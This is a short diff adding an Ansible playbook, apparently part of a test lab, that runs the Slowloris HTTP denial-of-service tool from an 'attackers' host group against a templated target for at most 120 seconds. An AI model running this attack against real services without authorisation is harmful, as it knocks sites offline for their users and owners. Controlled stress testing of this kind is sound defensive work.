@@ -1,0 +1,10 @@
+---
+- name: Slowloris attack
+  hosts: attackers
+  gather_facts: false
+  become: true
+
+  tasks:
+    - name: Run Slowloris (low bandwith HTTP stress)
+      shell: "timeout {{ [duration | int, 120] | min }}s /opt/slowloris/slowloris.py -ua -s 150 {{ target }}"
+      ignore_errors: true
